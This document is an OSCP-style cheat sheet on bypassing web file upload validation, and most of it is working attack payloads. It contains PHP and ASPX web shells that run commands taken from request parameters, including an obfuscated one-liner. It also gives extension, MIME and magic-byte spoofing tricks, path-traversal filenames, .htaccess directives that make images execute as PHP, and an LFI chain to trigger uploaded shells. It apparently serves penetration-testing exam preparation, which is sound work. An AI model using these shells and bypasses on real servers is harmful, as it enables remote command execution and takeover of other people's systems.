# File Upload Bypass Cheat Sheet (OSCP)

## 1. Recon the Upload Mechanism
Identify what is actually being validated:
- Client-side JavaScript only
- Server-side extension checks
- MIME type validation
- Magic bytes (file header)
- Content inspection
- Filename/path handling
- Upload directory execution permissions

Quick questions:
- Does a request reach the server?
- Can it be modified in Burp?
- Does curl succeed?

---

## 2. Client-Side Validation Bypass

### What It Is
Validation performed only in the browser (JavaScript, HTML attributes, frontend frameworks).
Anything enforced client-side can be bypassed.

### How to Identify
- Error appears instantly
- Upload button disabled
- No request in Burp or DevTools Network tab

### Bypass Methods

**Disable JavaScript**
- Firefox: about:config → javascript.enabled → false
- Chrome: DevTools → Settings → Disable JavaScript

**Burp Suite (Preferred)**
1. Upload a valid file (test.jpg)
2. Intercept request
3. Modify filename/content before forwarding

```
filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

**Modify HTML**
Remove or change:
```
accept=".jpg,.png"
```

**curl**
```
curl -X POST http://target/upload.php -F "file=@shell.php"
```

---

## 3. Extension Bypass Techniques

Common PHP extensions:
```
.php .phtml .php3 .php4 .php5 .phar
```

Double extensions:
```
shell.php.jpg
shell.phtml.png
```

Case variations:
```
shell.PHP
shell.PhP
```

Trailing characters:
```
shell.php.
shell.php%20
shell.php%00
```

---

## 4. MIME-Type Bypass

Change header:
```
Content-Type: image/jpeg
```

Even when uploading:
```
shell.php
```

---

## 5. Magic Bytes Bypass

JPEG header + PHP:
```
GIF89a
<?php system($_GET['cmd']); ?>
```

or
```
\xFF\xD8\xFF\xE0
<?php system($_GET['cmd']); ?>
```

Filename:
```
shell.php.jpg
```

---

## 6. Filename Manipulation

Path traversal:
```
../../shell.php
..%2f..%2fshell.php
```

Overwrite attempts:
```
index.php
config.php
```

---

## 7. PHP Payloads

Basic:
```
<?php system($_GET['cmd']); ?>
```

Alternatives:
```
<?php exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php shell_exec($_GET['cmd']); ?>
```

Obfuscated:
```
<?=$_GET[0]($_GET[1]);?>
```

Usage:
```
?0=system&1=id
```

---

## 8. .htaccess Abuse (Apache)

Force PHP execution for images.

Enable PHP for images:
```
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
```

Enable PHP engine:
```
php_flag engine on
```

Force handler:
```
SetHandler application/x-httpd-php
```

Upload order:
1. .htaccess
2. shell.jpg

Access:
```
/uploads/shell.jpg?cmd=id
```

Notes:
- Apache only
- Requires AllowOverride enabled
- Some servers block .htaccess

---

## 9. Upload Directory Enumeration

Common paths:
```
/uploads/
/upload/
/files/
/images/
/assets/
/media/
```

Fuzz:
```
ffuf -u http://target/FUZZ/shell.php -w dirs.txt
```

---

## 10. Non-Executable Upload → LFI Chain

```
?page=../../uploads/shell.jpg
```

---

## 11. Windows IIS / ASPX

ASPX shell:
```
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]); %>
```

Filename tricks:
```
shell.aspx.jpg
shell.asp;.jpg
```

---

## 12. OSCP Checklist

- Intercept upload
- Test client-side validation
- Try extension tricks
- Modify MIME type
- Add magic bytes
- Upload .htaccess
- Enumerate upload dir
- Chain with LFI
